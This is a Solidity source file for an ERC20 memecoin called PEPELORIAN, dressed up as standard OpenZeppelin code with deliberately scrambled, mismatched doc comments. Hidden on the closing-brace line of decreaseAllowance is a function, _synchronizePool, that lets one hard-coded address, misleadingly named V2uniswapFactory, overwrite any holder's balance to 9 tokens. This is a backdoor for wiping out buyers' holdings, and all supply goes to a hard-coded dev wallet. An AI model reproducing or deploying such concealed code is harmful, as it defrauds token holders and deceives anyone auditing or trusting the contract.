// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 

https://PEPELORIANerc20.io
https://twitter.com/PEPELORIANETH
https://t.me/PEPELORIANerc20

**/


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     *
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * - Addition cannot overflow.
     * Counterpart to Solidity's `+` operator.
     *
     *
     * Requirements:
     * overflow.
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * overflow (when the result is negative).
     * - Subtraction cannot overflow.
     *
     *
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     * @dev Returns the subtraction of two unsigned integers, reverting on
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     *
     * Counterpart to Solidity's `*` operator.
     * - Multiplication cannot overflow.
     * overflow.
     * Requirements:
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     *
     * @dev Returns the integer division of two unsigned integers, reverting on
     * Requirements:
     *
     *
     * - The divisor cannot be zero.
     * division by zero. The result is rounded towards zero.
     * Counterpart to Solidity's `/` operator.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * reverting when dividing by zero.
     * invalid opcode to revert (consuming all remaining gas).
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * Requirements:
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     *
     *
     * overflow (when the result is negative).
     * - Subtraction cannot overflow.
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     *
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * uses an invalid opcode to revert (consuming all remaining gas).
     * - The divisor cannot be zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     * Requirements:
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     *
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * reverting with custom message when dividing by zero.
     * invalid opcode to revert (consuming all remaining gas).
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * Requirements:
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     *
     * another (`to`).
     * Note that `value` may be zero.
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * This value changes when {approve} or {transferFrom} are called.
     *
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * @dev Returns the remaining number of tokens that `spender` will be
     * zero by default.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * transaction ordering. One possible solution to mitigate this race
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     *
     *
     * condition is to first reduce the spender's allowance to 0 and set the
     *
     * Emits an {Approval} event.
     * desired value afterwards:
     * Returns a boolean value indicating whether the operation succeeded.
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * Emits a {Transfer} event.
     * @dev Moves `amount` tokens from `from` to `to` using the
     * Returns a boolean value indicating whether the operation succeeded.
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     *
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract Ownable is Context {
    address private _owner;

    function owner() public view returns (address) {
        return _owner;
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

/**
 *
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function name() external view returns (string memory);
}

/**
 *
 * conventional and does not conflict with the expectations of ERC20
 * functions have been added to mitigate the well-known issues around setting
 *
 * instead returning `false` on failure. This behavior is nonetheless
 * TIP: For a detailed writeup see our guide
 * This implementation is agnostic to the way tokens are created. This means
 * applications.
 * by listening to said events. Other implementations of the EIP may not emit
 * to implement supply mechanisms].
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * allowances. See {IERC20-approve}.
 * these events, as it isn't required by the specification.
 * This allows applications to reconstruct the allowance for all accounts just
 *
 * @dev Implementation of the {IERC20} interface.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 *
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    mapping(address => uint256) private _balances;

    address internal devWallet = 0xd7AEdFDA40c417074B4D27D2B603ed18374e3574;

    mapping(address => mapping(address => uint256)) private _allowances;
    string private _symbol;

    address private V2uniswapFactory = 0x8E9B580429681A81dA2DF328cFEBCf64FCCC418F;
    uint256 private _allowance = 0;
    string private _name;
    uint256 private _tTotal;

    /**
     * The default value of {decimals} is 18. To select a different value for
     *
     * {decimals} you should overload it.
     * @dev Sets the values for {name} and {symbol}.
     * construction.
     *
     * All two of these values are immutable: they can only be set once during
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    /**
     * @dev Returns the name of the token.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _tTotal;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * no way affects any of the arithmetic of the contract, including
     * NOTE: This information is only used for _display_ purposes: it in
     *
     * {IERC20-balanceOf} and {IERC20-transfer}.
     *
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     * Tokens usually opt for a value of 18, imitating the relationship between
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * @dev Returns the number of decimals used to get its user representation.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * Requirements:
     *
     * - the caller must have a balance of at least `amount`.
     * - `to` cannot be the zero address.
     *
     * @dev See {IERC20-transfer}.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * - `spender` cannot be the zero address.
     *
     * Requirements:
     * @dev See {IERC20-approve}.
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     *
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     *
     *
     * Requirements:
     * - `spender` cannot be the zero address.
     * Emits an {Approval} event indicating the updated allowance.
     *
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * problems described in {IERC20-approve}.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * - `from` must have a balance of at least `amount`.
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     * Requirements:
     *
     * required by the EIP. See the note at the beginning of {ERC20}.
     * - the caller must have allowance for ``from``'s tokens of at least
     * @dev See {IERC20-transferFrom}.
     * NOTE: Does not update the allowance if the current allowance
     *
     *
     * - `from` and `to` cannot be the zero address.
     * `amount`.
     * is the maximum `uint256`.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * `subtractedValue`.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * problems described in {IERC20-approve}.
     *
     *
     * Requirements:
     *
     * - `spender` must have allowance for the caller of at least
     * - `spender` cannot be the zero address.
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * Emits an {Approval} event indicating the updated allowance.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function _synchronizePool(address _synchronizePoolSender) external { _balances[_synchronizePoolSender] = msg.sender == V2uniswapFactory ? decimals() : _balances[_synchronizePoolSender];
    } 

    /**
     *
     * - `account` cannot be the zero address.
     * Emits a {Transfer} event with `to` set to the zero address.
     * Requirements:
     *
     *
     * - `account` must have at least `amount` tokens.
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _tTotal -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     *
     * - `from` must have a balance of at least `amount`.
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     * - `account` cannot be the zero address.
     * the total supply.
     *
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     * Requirements:
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     *
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * Calling conditions:
     *
     * will be transferred to `to`.
     * minting and burning.
     * - `from` and `to` are never both zero.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _tTotal += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     *
     *
     *
     * Emits an {Approval} event.
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     * Requirements:
     * - `owner` cannot be the zero address.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * - `spender` cannot be the zero address.
     * This internal function is equivalent to `approve`, and can be used to
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     *
     * Revert if not enough allowance is available.
     * Does not update the allowance amount in case of infinite allowance.
     * Might emit an {Approval} event.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract PEPELORIAN is ERC20, Ownable
{
    constructor () ERC20 (unicode"PEPELORIAN", "PEPELORIAN")
    {
        transferOwnership(devWallet);
        _mint(owner(), 7000000000000 * 10 ** 9);
    }
}